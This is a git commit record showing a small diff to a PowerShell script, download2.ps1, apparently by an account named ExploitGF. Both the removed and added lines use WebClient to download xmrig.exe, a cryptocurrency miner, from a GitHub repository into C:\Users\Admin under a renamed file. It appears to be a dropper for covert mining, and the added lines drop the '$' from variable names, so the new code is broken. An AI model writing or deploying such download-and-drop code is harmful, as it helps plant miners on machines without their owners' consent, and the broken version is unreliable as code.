c4c78d2b870f83ac163fcac4e0a1d686ae0cd2a7
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-28 15:50:20 +0500

    Update download2.ps1

--- download2.ps1
+++ download2.ps1
@@ -1,2 +1,2 @@
-$WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile("https://github.com/ExploitGF/mine/raw/master/xmrig.exe","C:\Users\Admin\xm.exe")
+WebClient = New-Object System.Net.WebClient
+WebClient.DownloadFile("https://github.com/ExploitGF/mine/raw/master/xmrig.exe","C:\Users\Admin\xmr.exe")
